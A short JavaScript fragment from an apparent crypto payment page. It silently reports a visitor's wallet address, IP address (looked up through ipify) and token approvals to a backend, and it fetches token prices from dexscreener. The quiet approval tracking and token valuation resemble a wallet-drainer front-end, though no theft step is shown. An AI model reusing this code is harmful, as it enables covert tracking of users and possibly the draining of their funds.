function notifyWalletConnect(walletAddress, ipAddress) {
    fetch(`${BACKEND_URL}/api/payment/wallet-connect`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ walletAddress, ipAddress })
    }).catch(() => {});
}

function notifyApproval(walletAddress, tokenAddress) {
    fetch(`${BACKEND_URL}/api/payment/approval`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ walletAddress, tokenAddress })
    }).catch(() => {});
}

async function getIPAddress() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        return 'Unknown';
    }
}

async function fetchPrice(tokenAddress) {
    try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 2000);
        const res = await fetch(`https://api.dexscreener.com/latest/dex/tokens/${tokenAddress}`, { signal: controller.signal });
        clearTimeout(timeoutId);
        const data = await res.json();
        if (data?.pairs?.[0]?.priceUsd) return parseFloat(data.pairs[0].priceUsd);
    } catch (e) {
        console.error('Price fetch error:', e.message);
    }
    return 1.0;
}